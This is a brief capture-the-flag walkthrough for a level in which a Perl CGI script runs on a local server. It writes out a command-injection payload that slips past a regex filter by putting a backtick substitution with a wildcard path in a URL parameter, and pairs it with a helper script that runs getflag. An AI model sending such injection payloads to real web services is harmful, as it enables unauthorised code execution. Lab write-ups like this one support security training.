The perl program runs a local server as in level04 and runs CGI as well.

It is not possible to run a binary directly through the url this time since the regex in the program makes it impossible.

The solution is then to execute a file instead of a command :

touch /tmp/RUN

In which we write :

#!/bin/sh
getflag > /tmp/flag

Put privileges :

chmod +x RUN

Send request :

IP/?x="`/*/RUN`"

The flag is written in /tmp/flag.
